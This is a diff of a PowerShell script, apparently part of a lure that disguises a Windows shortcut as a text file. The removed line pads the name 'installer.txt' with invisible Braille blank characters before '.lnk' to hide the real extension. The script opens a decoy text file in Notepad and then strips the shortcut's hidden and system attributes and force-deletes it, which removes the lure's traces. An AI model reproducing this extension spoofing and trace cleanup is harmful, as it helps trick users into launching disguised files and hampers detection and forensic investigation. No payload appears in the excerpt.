@@ -10,13 +10,26 @@ Start-Process notepad.exe $txt
 
 $folder = (Get-Location).Path
 
-$lnk = Join-Path $folder "installer.txt⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀.lnk"
+$lnk = Join-Path $folder "installer.lnk"
 $txt = Join-Path $folder "installer.txt"
 
-Start-Sleep -Seconds 2
+Start-Sleep -Seconds 5
+
+Write-Host "Пытаюсь удалить: $lnk"
 
 if (Test-Path $lnk) {
-    Remove-Item $lnk -Force
+    # attrib -r -s -h $lnk
+    # [System.IO.File]::Delete($lnk)
+
+    try {
+        attrib -r -s -h $lnk 2>$null
+        Remove-Item $lnk -Force -ErrorAction Stop
+        Write-Host "Файл успешно удалён."
+    } catch {
+        Write-Host "Не удалось удалить: $_"
+    }
+} else {
+    Write-Host "Файл не найден по указанному пути."
 }
 
 @"
